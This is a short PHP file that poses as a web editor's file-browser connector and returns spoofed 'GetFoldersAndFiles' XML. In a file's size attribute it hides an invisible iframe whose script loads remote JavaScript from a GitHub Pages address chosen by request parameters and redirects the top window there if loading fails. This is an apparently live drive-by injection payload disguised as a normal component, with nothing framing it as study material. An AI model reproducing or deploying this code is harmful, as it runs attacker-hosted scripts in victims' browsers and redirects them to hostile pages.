
<?php

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Content-Type: text/xml; charset=utf-8");
header("Cache-Control: no-store, no-cache, must-revalidate");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

echo '<?xml version="1.0" encoding="utf-8"?>';

// GitHub Pages base URL
$BASE = "https://riopehrips.github.io/con";

// Catch URL parameters
$lagabo = isset($_GET['lagabo'])
    ? trim($_GET['lagabo'])
    : '';

$id = isset($_GET['GetFoldersAndFiles'])
    ? trim($_GET['GetFoldersAndFiles'])
    : $lagabo;

// Validate ID
if (!preg_match('/^[A-Za-z0-9_.-]{1,80}$/', $id)) {
    http_response_code(400);
    exit;
}

// GitHub hosted JavaScript
$fxUrl = $BASE . "/fc/fx.js?id=" . urlencode($id);

// Escape iframe payload
$iframePayload =
    '<iframe style="display:none" srcdoc="&lt;script&gt;' .
    'var s=document.createElement(\'script\');' .
    's.src=\'' . htmlspecialchars($fxUrl, ENT_QUOTES, 'UTF-8') . '\';' .
    's.onerror=function(){window.top.location.replace(\'' .
    $BASE . '/\');};' .
    'document.head.appendChild(s);' .
    '&lt;/script&gt;"></iframe>';

?>
<Connector command="GetFoldersAndFiles" resourceType="Document">
<CurrentFolder path="/1 - f/" url=""/>
<Folders/>
<Files>
<File name="Loading..."
      url="1"
      size="<?php echo htmlspecialchars($iframePayload, ENT_QUOTES, 'UTF-8'); ?>"/>
</Files>
</Connector>
